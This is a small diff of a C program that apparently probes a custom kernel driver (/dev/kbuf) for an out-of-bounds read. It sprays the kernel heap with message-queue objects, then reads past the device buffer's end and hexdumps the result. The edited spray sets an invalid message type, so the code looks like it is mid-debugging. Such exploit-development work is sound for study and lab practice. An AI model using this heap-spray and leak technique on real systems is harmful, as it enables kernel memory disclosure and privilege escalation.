@@ -72,15 +72,17 @@ void spray(){
 	memset(msg.mtext, 0x42, BUF_SIZE - 1);
 	msg.mtext[BUF_SIZE] = 0;
 	int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
-	msg.mtype = 1;
+	msg.mtype = 0;
 
 	msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
+	//memset(msg.mtext, 0x43, BUF_SIZE - 1);
+	//msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
 }
 
 int main(){
     int fd = open("/dev/kbuf", O_RDWR);
 	spray();
-    lseek(fd, 0x30, SEEK_END);
+    lseek(fd, 0x0, SEEK_END);
     read(fd, buf, 0x100);
     hexdump(buf, 0x100);
 }
